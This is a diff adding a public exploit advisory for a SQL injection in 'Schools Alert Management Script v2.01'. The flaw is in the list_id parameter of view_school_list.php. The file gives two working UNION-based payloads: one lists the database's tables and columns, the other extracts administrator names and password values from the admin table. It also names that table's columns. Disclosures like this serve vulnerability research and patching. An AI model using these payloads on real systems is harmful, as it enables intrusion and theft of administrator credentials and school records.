@@ -1,0 +1,26 @@
+# # # # # 
+# Exploit Title: Schools Alert Management Script v2.01 - SQL Injection
+# Google Dork: N/A
+# Date: 06.03.2017
+# Vendor Homepage: http://www.phpscriptsmall.com/
+# Software : http://www.phpscriptsmall.com/product/schools-alert-management-system/
+# Demo: http://www.schoolcollageerp.com/schoolalert/
+# Version: 2.01
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[@]ihsan[.]net
+# # # # #
+# SQL Injection/Exploit :
+# http://localhost/[PATH]/view_school_list.php?list_id=[SQL]
+# For example;
+# -14'+/*!50000union*/+select+1,0x496873616e2053656e63616e203c62723e7777772e696873616e2e6e6574,3,4,5,6,7,8,9,10,11,12,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),14,15--+-
+# admin :Id
+# admin :AdminName
+# admin :AdminPass
+# admin :AdminEmail
+# admin :CreatedDate
+# -14'+/*!50000union*/+select+1,0x496873616e2053656e63616e203c62723e7777772e696873616e2e6e6574,3,4,5,6,7,8,9,10,11,12,/*!50000ConCat(*/AdminName,/*!50000char*/(58),AdminPass),14,15+from+admin--+-
+# Etc...
+# # # # #
